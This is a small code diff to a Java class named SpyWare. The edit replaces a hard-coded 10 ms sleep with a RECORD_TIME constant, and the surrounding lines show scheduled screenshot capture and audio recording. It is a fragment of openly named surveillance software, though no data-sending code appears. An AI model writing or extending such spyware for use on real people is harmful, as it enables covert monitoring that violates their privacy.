@@ -20,7 +20,6 @@ public class SpyWare {
         startAndFinishRecordingAudio();
     }
 
-
     private void startTakingScreenshot() {
         Screenshot screenshot = new Screenshot();
         pool.scheduleWithFixedDelay(screenshot::captureScreen,
@@ -66,7 +65,7 @@ public class SpyWare {
      */
     public static void stopAudioLine(AudioRecorder audioRecorder) {
         try {
-            Thread.sleep(10);
+            Thread.sleep(RECORD_TIME);
         } catch (InterruptedException e) {
             e.printStackTrace();
         }
